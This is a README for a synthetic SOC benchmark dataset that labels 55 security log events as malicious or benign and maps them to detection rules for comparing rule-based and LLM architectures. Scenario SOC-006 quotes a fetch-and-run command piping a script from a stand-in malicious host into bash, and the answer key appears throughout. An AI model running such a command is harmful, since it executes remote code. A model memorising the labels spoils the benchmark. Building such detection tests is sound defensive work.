# Research-Grade Synthetic Evaluation Dataset (v1.0.0)

## 1. Overview & Dataset Identity

- **Dataset Name**: Research Synthetic Evaluation Dataset v1
- **Dataset Identifier**: `research_synthetic_v1`
- **Version**: `1.0.0`
- **Release Date**: `2026-10-20`
- **Dataset Type**: Research-grade synthetic evaluation benchmark
- **Target System**: SOC Analyst Co-Pilot / AI-based Cybersecurity Security Assessment Framework

### Purpose and Intended Research Use
This dataset provides a standardized, reproducible, and balanced set of cybersecurity scenarios designed for comparative evaluation across all five supported system architectures in the SOC Analyst Co-Pilot repository. It evaluates:
1. **Detection Accuracy**: Identification of true attacks (brute force, privilege escalation, malware download, C2 beaconing) vs. false alarm suppression.
2. **Context Enrichment Utility**: How contextual data (known asset roles, user privilege levels, threat indicators) impacts classification.
3. **Retrieval-Augmented Generation (RAG) Grounding**: Whether semantic evidence retrieved from vector knowledge bases improves analyst explanations and Mitre ATT&CK technique identification.
4. **Deterministic Risk Invariants**: Preserving deterministic risk scoring calculations without LLM drift.
5. **Data Quality Resilience**: Pipeline behavior when handling malformed logs, missing fields, schema edge cases, and exact duplicates.

> [!IMPORTANT]
> **Synthetic Data Disclaimer**: All scenarios, events, entity identifiers, and ground-truth labels in this dataset are **100% synthetic**. They were engineered specifically to exercise the exact parsers, rules, resolvers, and evaluation routines implemented in this repository. They do not represent real operational incidents or private enterprise data.

---

## 2. Dataset Inventory & Summary Metrics

Counts are calculated directly from the generated files:

| Metric | Count | Details |
| :--- | :---: | :--- |
| **Total Security Scenarios** | **35** | `SOC-001` through `SOC-035` |
| **Total Raw Events** | **55** | Distributed across 4 log source files |
| **Total Ground-Truth Labels** | **55** | Keyed by 16-character SHA-256 event ID |
| **Single-Event Scenarios** | **27** | Standalone alert, flow, or log events |
| **Multi-Event Scenarios** | **8** | Sequences containing 2 to 6 correlated events |
| **Malicious Events (Ground Truth)** | **18** | 32.7% of total events |
| **Benign Events (Ground Truth)** | **37** | 67.3% of total events (including edge cases & benign suspicious) |
| **Supported Log Formats** | **4** | Wazuh SIEM, Suricata EVE, Firewall, Generic JSON |

### Distribution by Event Source

| Source Platform | File Name | Raw Events | Scenarios Covered | Primary Event Types |
| :--- | :--- | :---: | :--- | :--- |
| **Wazuh SIEM** | `events/wazuh_scenarios.json` | 30 | `SOC-001` – `SOC-013` | Authentication failures/success, sudo privilege escalation, process execution |
| **Suricata IDS** | `events/suricata_scenarios.json` | 11 | `SOC-014` – `SOC-023` | Network intrusion alerts, C2 beaconing, malware downloads, DNS queries, TLS flows |
| **Firewall** | `events/firewall_scenarios.json` | 9 | `SOC-024` – `SOC-030` | Inbound/outbound pass/block, port-specific egress filtering |
| **Generic JSON** | `events/generic_scenarios.json` | 5 | `SOC-031` – `SOC-035` | System cron events, unusual time logins, conflicting status, minimal fields |
| **Total** | | **55** | **35 Scenarios** | |

### Ground-Truth Label Distribution & Research Taxonomy

The repository's Evaluation Lab requires binary ground-truth labels (`malicious` or `benign`) for calculating classification metrics (TP, FP, TN, FN, Precision, Recall, F1). The dataset satisfies this interface while annotating nuanced research categories in the `notes` field of every label:

```
Total Events: 55
├── Malicious (18 events, 32.7%)
│   ├── Brute Force Attack Sequence (SOC-001, SOC-011): 11 events
│   ├── Privilege Escalation via Sudo (SOC-005): 1 event
│   ├── Suspicious Process Execution / Payload Download (SOC-006): 1 event
│   ├── Known C2 Inbound SSH (SOC-014): 1 event
│   ├── Malware Payload Download (SOC-016): 1 event
│   └── C2 Beaconing to APT29 Infrastructure (SOC-017, SOC-019): 3 events
└── Benign (37 events, 67.3%)
    ├── Routine Operations (20 events)
    │   ├── Normal Internal Authentication (SOC-003, SOC-004): 2 events
    │   ├── Routine Admin Sudo Logrotate (SOC-007): 1 event
    │   ├── Normal HTTP/TLS/DNS Traffic (SOC-015, SOC-021, SOC-025, SOC-028): 4 events
    │   ├── Routine Scheduled Cron Tasks (SOC-033): 1 event
    │   └── Low-severity Informational Alerts (SOC-023): 1 event
    ├── Suspicious but Inconclusive / No Confirmed Compromise (11 events)
    │   ├── Failed Logins Below Threshold (SOC-002, SOC-012): 7 events
    │   ├── Failed Login for Invalid User (SOC-008): 1 event
    │   ├── Failed External then Successful Internal (SOC-013): 3 events
    │   ├── Firewall Blocked Outbound Attempts (SOC-024, SOC-027): 2 events
    │   ├── External Inbound Allowed Connections (SOC-026, SOC-030): 4 events
    │   ├── Suspicious Domain DNS / Low-Severity Scan (SOC-018, SOC-020): 2 events
    │   └── Unusual Login Time (SOC-034): 1 event
    └── Data-Quality & Schema Edge Cases (6 events)
        ├── Exact Duplicate Events for Deduplication Testing (SOC-010, SOC-017): 2 duplicates
        ├── Missing Key Fields (SOC-009, SOC-022, SOC-029, SOC-035): 4 events
        ├── Conflicting Fields (SOC-032): 1 event
        └── Minimal / Insufficient Evidence (SOC-031): 1 event
```

---

## 3. Five Supported Architectures & Configuration Mapping

The repository's Evaluation Lab orchestrator (`backend/evaluation/orchestrator.py`) and configuration registry (`backend/evaluation/models.py`) support exactly five architectures. The table below documents the mapping between research descriptions and the exact code identifiers:

| Research Architecture | Code Identifier (`config_id`) | Code Display Name | Active Pipeline Components | Authoritative Risk Score? | LLM Execution? |
| :--- | :--- | :--- | :--- | :---: | :---: |
| **1. Rule-Based Only** | `rule_based_only` | `Rule-Based Only` | L1 Normalization, L2 Enrichment, Rule Engine, Deterministic Risk Scoring | **Yes** (Deterministic) | Disabled |
| **2. LLM Only** | `llm_only` | `LLM Only` | L1 Normalization, L2 Enrichment, LLM Direct Analysis | **No** (LLM estimate only) | Enabled (No rules, No RAG) |
| **3. LLM + RAG** | `llm_rag` | `LLM + RAG` | L1 Normalization, L2 Enrichment, Vector RAG Retrieval, LLM Analysis | **No** (LLM estimate only) | Enabled (RAG context included) |
| **4. LLM + Rule-Based** | `llm_rule_based` | `LLM + Rule-Based` | L1 Normalization, L2 Enrichment, Rule Engine, Deterministic Risk Scoring, LLM Interpretation | **Yes** (Deterministic) | Enabled (Rule findings in prompt) |
| **5. Full Framework** | `full_framework` | `Proposed Complete Framework` | L1 Normalization, L2 Enrichment, Rule Engine, Risk Scoring, Vector RAG, LLM Analysis, Judge, Deterministic XAI | **Yes** (Immutable) | Enabled (Production pipeline) |

### Fairness Guarantees Across Architectures
- **Single Source of Truth**: All five architectures evaluate the exact same underlying normalized events.
- **Normalization Once**: Events are normalized once through L1 and deduplicated before being passed identically to each configuration runner.
- **Strict Input/Label Separation**: Input files contain only raw event telemetry; no expected labels, risk scores, rule IDs, or analyst conclusions exist within the input data.
- **Authoritative Score Isolation**: In `rule_based_only`, `llm_rule_based`, and `full_framework`, the deterministic risk score is computed by Part 2 and remains immutable. In `llm_only` and `llm_rag`, any score produced by the LLM is flagged as `llm_estimate` and never confused with the deterministic score.

---

## 4. Detailed Scenario Inventory

### Wazuh Scenarios (`events/wazuh_scenarios.json`)

| Scenario ID | Event ID | Ground Truth | Expected Rule | Description & Rationale |
| :--- | :--- | :---: | :---: | :--- |
| **SOC-001** | `SOC-001-E01` – `E05`<br>`SOC-001-E06` | `malicious`<br>`malicious` | `AUTH-001`<br>None | **Brute Force Sequence**: 5 failed SSH logins from known C2 `185.20.10.1` targeting `admin` on `web-prod-01`, followed immediately by a successful login (`E06`). Triggers threshold rule `AUTH-001` (5 events in 5m window). |
| **SOC-002** | `SOC-002-E01` – `E03` | `benign` | None | **Sub-threshold Failures**: 3 failed logins from internal IP `192.168.1.100` by user `jsmith`. Tests threshold boundary; must NOT trigger `AUTH-001`. |
| **SOC-003** | `SOC-003-E01` | `benign` | None | **Typo Failure**: Single failed login from internal IP `10.0.1.50`. Routine event. |
| **SOC-004** | `SOC-004-E01` | `benign` | None | **Normal Admin Login**: Successful SSH login from internal admin workstation during business hours. |
| **SOC-005** | `SOC-005-E01` | `malicious` | `PRIV-001` | **Privilege Escalation**: User `admin` executes `/bin/bash` as root via `sudo` originating from known C2 IP `185.20.10.1`. Triggers `PRIV-001`. |
| **SOC-006** | `SOC-006-E01` | `malicious` | None | **Suspicious Process Execution**: `auditd` log showing root executing `curl http://malicious.com/payload.sh \| bash`. Evaluates LLM/RAG detection without a custom rule. |
| **SOC-007** | `SOC-007-E01` | `benign` | `PRIV-001` | **Admin False-Positive Candidate**: User `system` running routine `logrotate` via `sudo`. Tests whether rule engines produce false alarms on service accounts that LLMs or RAG can contextualize as routine. |
| **SOC-008** | `SOC-008-E01` | `benign` | None | **Invalid User Probe**: Single failed login for invalid user `guest` from external IP `203.0.113.99`. Suspicious reconnaissance, but no compromise. |
| **SOC-009** | `SOC-009-E01` | `benign` | None | **Missing Fields Edge Case**: Auth failure missing `srcip` and `username`. Tests parser null-safety and resilience. |
| **SOC-010** | `SOC-010-E01`<br>`SOC-010-E02` | `benign` | None | **Exact Duplicate Testing**: Two identical failed login logs from `198.51.100.5`. Tests L1 SHA-256 fingerprint deduplication. |
| **SOC-011** | `SOC-011-E01` – `E05` | `malicious` | `AUTH-001` | **Exact Threshold Boundary**: Exactly 5 failed logins within 2 minutes from `203.0.113.50`. Tests strict equality on threshold condition `>= 5`. |
| **SOC-012** | `SOC-012-E01` – `E04` | `benign` | None | **Near-Threshold Boundary**: Exactly 4 failed logins from `192.168.1.50`. Must NOT trigger threshold of 5. |
| **SOC-013** | `SOC-013-E01` – `E02`<br>`SOC-013-E03` | `benign`<br>`benign` | None | **Ambiguous Authentication Pattern**: 2 failed logins from external IP followed by a successful login from internal IP `10.0.1.50`. Inconclusive admin activity. |

### Suricata Scenarios (`events/suricata_scenarios.json`)

| Scenario ID | Event ID | Ground Truth | Expected Rule | Description & Rationale |
| :--- | :--- | :---: | :---: | :--- |
| **SOC-014** | `SOC-014-E01` | `malicious` | None | **Inbound C2 Connection**: Suricata alert for inbound SSH from known C2 IP `185.20.10.1` (`ET SCAN Suspicious inbound SSH`). Matches threat context. |
| **SOC-015** | `SOC-015-E01` | `benign` | None | **Normal HTTP Flow**: Outbound flow to `93.184.216.34` (example.com). Baseline network flow. |
| **SOC-016** | `SOC-016-E01` | `malicious` | None | **Malware Download Alert**: Suricata alert for Emotet payload download from `malicious.com` (`ET MALWARE`). |
| **SOC-017** | `SOC-017-E01`<br>`SOC-017-E02` | `malicious` | None | **Duplicate IDS Alert**: Duplicate alert for APT29 C2 beaconing. Tests L1 deduplication of alert structures. |
| **SOC-018** | `SOC-018-E01` | `benign` | None | **Suspicious Domain Query**: DNS query to `update.suspicious-software-test.com`. Looks suspicious by string naming, but has no malicious IOC match or alert. |
| **SOC-019** | `SOC-019-E01` | `malicious` | None | **Active C2 Beaconing**: Suricata alert for APT29 periodic beaconing to `185.20.10.1:443`. |
| **SOC-020** | `SOC-020-E01` | `benign` | None | **Low Severity Port Scan**: Informational port scan alert from `198.51.100.20`. Low severity (3), no confirmed intrusion. |
| **SOC-021** | `SOC-021-E01` | `benign` | None | **Normal TLS Handshake**: TLS flow to Cloudflare CDN with valid certificate. |
| **SOC-022** | `SOC-022-E01` | `benign` | None | **Missing Severity Alert**: Informational alert missing the `severity` field entirely. Edge case for schema normalization. |
| **SOC-023** | `SOC-023-E01` | `benign` | None | **Informational DNS Notice**: Low-severity query for `.local` domain. Normal local network discovery. |

### Firewall Scenarios (`events/firewall_scenarios.json`)

| Scenario ID | Event ID | Ground Truth | Expected Rule | Description & Rationale |
| :--- | :--- | :---: | :---: | :--- |
| **SOC-024** | `SOC-024-E01` | `benign` | None | **Blocked Outbound Connection**: Firewall blocked outbound connection from `web-prod-01` to port `4444`. Suspicious destination, but firewall successfully prevented connection (no compromise). |
| **SOC-025** | `SOC-025-E01` | `benign` | None | **Normal Outbound HTTPS**: Outbound HTTPS from `10.0.0.50` to `1.1.1.1:443` allowed by rule. |
| **SOC-026** | `SOC-026-E01` – `E03` | `benign` | None | **Allowed Inbound from C2**: Repeated inbound HTTPS connections from `185.20.10.1` allowed by perimeter firewall. Suspicious due to C2 origin, but no rule engine trigger exists for firewall logs. |
| **SOC-027** | `SOC-027-E01` | `benign` | None | **Blocked Outbound SMB**: Outbound SMB (port 445) to `185.20.10.1` blocked by default egress policy. Prevented attack. |
| **SOC-028** | `SOC-028-E01` | `benign` | None | **Normal DNS Egress**: Outbound UDP DNS traffic to Google Public DNS (`8.8.8.8:53`) allowed. |
| **SOC-029** | `SOC-029-E01` | `benign` | None | **Missing Port Edge Case**: Allowed outbound flow missing destination port attribute. |
| **SOC-030** | `SOC-030-E01` | `benign` | None | **External SSH Inbound Allowed**: Firewall allowed inbound port 22 connection from `203.0.113.99`. |

### Generic Structured Scenarios (`events/generic_scenarios.json`)

| Scenario ID | Event ID | Ground Truth | Expected Rule | Description & Rationale |
| :--- | :--- | :---: | :---: | :--- |
| **SOC-031** | `SOC-031-E01` | `benign` | None | **Insufficient Evidence / Minimal Fields**: Event containing only `event_type` and generic message; no IP addresses, usernames, ports, or processes. Must evaluate as inconclusive or benign due to lack of evidence. |
| **SOC-032** | `SOC-032-E01` | `benign` | None | **Conflicting Telemetry**: `action="success"` and `event_type="authentication_success"` but message indicates HTTP 401 error. Tests reasoning under ambiguity. |
| **SOC-033** | `SOC-033-E01` | `benign` | None | **Routine Maintenance Cron**: System execution of `/usr/local/bin/backup.sh` at 03:00 UTC. Normal administrative baseline. |
| **SOC-034** | `SOC-034-E01` | `benign` | None | **Unusual Login Time**: Successful login by user `admin` at 02:30 UTC. Off-hours login from internal IP. |
| **SOC-035** | `SOC-035-E01` | `benign` | None | **Missing Timestamp Edge Case**: Internal connection log lacking timestamp field. Tests adapter fallback handling. |

---

## 5. Detection Rule Coverage & Interaction

The repository defines three rules in `backend/part2/rules_config/rules.json`:

1. **`AUTH-001`**: Multiple Failed Authentication Attempts
   - *Condition*: `event.event_type equals "authentication_failure"`
   - *Aggregation*: Threshold `>= 5` events within `window_minutes = 5`, grouped by `event.source.ip`
   - *Severity*: High (`0.90` confidence, MITRE `T1110 Brute Force`)
   - *Triggering Scenarios*: `SOC-001` (5 events), `SOC-011` (5 events - threshold boundary).
   - *Non-Triggering Tests*: `SOC-002` (3 events), `SOC-012` (4 events - 1 below threshold), `SOC-003` (1 event), `SOC-013` (2 events).

2. **`PRIV-001`**: Privileged User Suspicious Activity
   - *Condition*: `user_context.privilege_level in ["privileged", "root", "domain_admin", "system", "admin", "administrator"]`
   - *Severity*: High (`0.85` confidence)
   - *Triggering Scenarios*: `SOC-005` (admin sudo bash), `SOC-007` (system sudo logrotate).
   - *Research Note*: `SOC-007` demonstrates a deterministic rule false positive on routine administrative activity, allowing evaluation of whether LLM/Judge configurations can correctly contextualize benign maintenance.

3. **`ASSET-001`**: High Criticality Asset Activity
   - *Condition*: `asset_context.criticality equals "critical"`
   - *Severity*: High (`0.85` confidence)
   - *Relevant Asset*: `10.0.0.50` (`db-prod-01`, Critical criticality).

---

## 6. Context & RAG Grounding Data

Context records matching the repository's active mock databases (`backend/l2/context/resolvers.py`) and vector knowledge store (`backend/vectorstore/knowledge_config/seed_knowledge.json`) are documented in `context/synthetic_context.json`:

- **Assets**:
  - `10.0.0.5` (`web-prod-01`, Server, Production, High Criticality)
  - `10.0.0.50` (`db-prod-01`, Database, Production, Critical Criticality)
  - `192.168.1.100` (`workstation-john`, Workstation, Corporate, Low Criticality)
- **Users**:
  - `admin` (System Administrator, Root Privilege)
  - `system` (Service Account, System Privilege)
  - `john.doe` / `jsmith` (Employee, Standard Privilege)
- **Threat Intelligence Indicators**:
  - `185.20.10.1` (APT29 C2 IP, High Confidence)
  - `malicious.com` (Emotet Domain, Medium Confidence)
- **RAG Knowledge Base Documents**:
  - `SEC-KB-001`: Unauthorized privileged access (`T1548`)
  - `SEC-KB-002`: Valid Accounts (`T1078`)
  - `SEC-KB-003`: Baseline authentication behaviour
  - `SEC-KB-004`: Brute Force (`T1110`)
  - `SEC-KB-005`: Command and control traffic (`T1071`)
  - `SEC-KB-006`: UAC bypass (`T1548`)

---

## 7. Supported Dataset Loading Mechanisms

The dataset is fully compatible with the existing Evaluation Lab API routes in `backend/evaluation/routes.py`:

### Method 1: Upload via Evaluation Lab REST API (Recommended)

1. **Upload Ground Truth Dataset**:
   ```bash
   curl -X POST "http://localhost:8000/api/eval/ground-truth/upload" \
     -F "file=@test_data/research_dataset/ground_truth/research_ground_truth.json"
   ```
   *Expected Response*: `{"dataset_id": "research_synthetic_v1", "name": "Research Synthetic Evaluation Dataset v1", "label_count": 55}`.

2. **Run Evaluation Across All Five Architectures**:
   ```bash
   curl -X POST "http://localhost:8000/api/eval/run/upload" \
     -F "files=@test_data/research_dataset/events/wazuh_scenarios.json" \
     -F "files=@test_data/research_dataset/events/suricata_scenarios.json" \
     -F "files=@test_data/research_dataset/events/firewall_scenarios.json" \
     -F "files=@test_data/research_dataset/events/generic_scenarios.json" \
     -F "ground_truth_dataset_id=research_synthetic_v1" \
     -F "configurations=rule_based_only,llm_only,llm_rag,llm_rule_based,full_framework" \
     -F "notes=Comprehensive 5-architecture benchmark"
   ```

### Method 2: Direct File Placement in Output Directory

Place `research_ground_truth.json` directly into the ground truth directory:
```bash
cp test_data/research_dataset/ground_truth/research_ground_truth.json backend/output/eval_ground_truth/research_synthetic_v1.json
```
The persistence module (`evaluation/persistence.py`) immediately discovers it by `dataset_id="research_synthetic_v1"`.

### Method 3: Two-Stage Session Ingestion

1. Ingest logs via L1:
   ```bash
   curl -X POST "http://localhost:8000/api/l1/upload" \
     -F "files=@test_data/research_dataset/events/wazuh_scenarios.json" \
     -F "files=@test_data/research_dataset/events/suricata_scenarios.json"
   ```
   *Returns*: `{"session_id": "<SESSION_ID>", "events": 41, ...}`.

2. Run Evaluation against that session:
   ```bash
   curl -X POST "http://localhost:8000/api/eval/run/session/<SESSION_ID>" \
     -H "Content-Type: application/json" \
     -d '{
       "selected_configurations": ["rule_based_only", "llm_only", "llm_rag", "llm_rule_based", "full_framework"],
       "ground_truth_dataset_id": "research_synthetic_v1"
     }'
   ```

---

## 8. Directory Structure & File Inventory

```
test_data/
├── DATASET_README.md                     <-- Master research dataset documentation
├── current_demo/                         <-- Existing UI demonstration files (preserved)
│   ├── firewall_incident.json
│   ├── suricata_incident.json
│   ├── wazuh_alert.json
│   └── wazuh_incident.json
├── eval_ground_truth/                    <-- Existing 6-event smoke test dataset (preserved)
│   ├── synthetic_events.json
│   └── synthetic_smoke_test.json
└── research_dataset/                     <-- Research Evaluation Dataset (v1.0.0)
    ├── _generate.py                      <-- Deterministic generator script
    ├── DATASET_README.md                 <-- Local copy of dataset documentation
    ├── context/
    │   └── synthetic_context.json        <-- L2 asset, user, threat & RAG knowledge records
    ├── events/
    │   ├── firewall_scenarios.json       <-- 9 firewall events (SOC-024 to SOC-030)
    │   ├── generic_scenarios.json        <-- 5 generic structured events (SOC-031 to SOC-035)
    │   ├── suricata_scenarios.json       <-- 11 Suricata EVE events (SOC-014 to SOC-023)
    │   └── wazuh_scenarios.json          <-- 30 Wazuh SIEM events (SOC-001 to SOC-013)
    ├── ground_truth/
    │   └── research_ground_truth.json    <-- 55 labels with expected rules & rationale
    └── manifests/
        └── dataset_manifest.json         <-- Machine-readable dataset inventory
```

---

## 9. Assumptions, Known Limitations & Scope Exclusions

1. **Rule Engine Scope**: The system uses a custom deterministic JSON rule engine (`backend/part2/rules/rule_engine.py`). It does not run native Sigma, YARA-L, or Snort rule syntax.
2. **Context Enrichment Scope**: Context is resolved via local Python lookup tables (`backend/l2/context/resolvers.py`). No external or live CTI feeds (VirusTotal, AlienVault, MISP) are connected.
3. **Graph Architecture**: Neo4j, Knowledge Graph traversal, and GraphRAG are not implemented in the current codebase and are therefore not exercised.
4. **Binary Ground-Truth Enforcement**: While the dataset models nuanced security states (suspicious, edge-case, benign administrative), the repository's evaluation metrics engine enforces binary `malicious` vs. `benign` for standard confusion matrix calculations.
5. **Deterministic Event IDs**: Event IDs are generated deterministically using the repository's exact formula: `SHA-256(id|timestamp|@timestamp|line_number)[:16]`. Ground truth labels map 1:1 to these hashes.
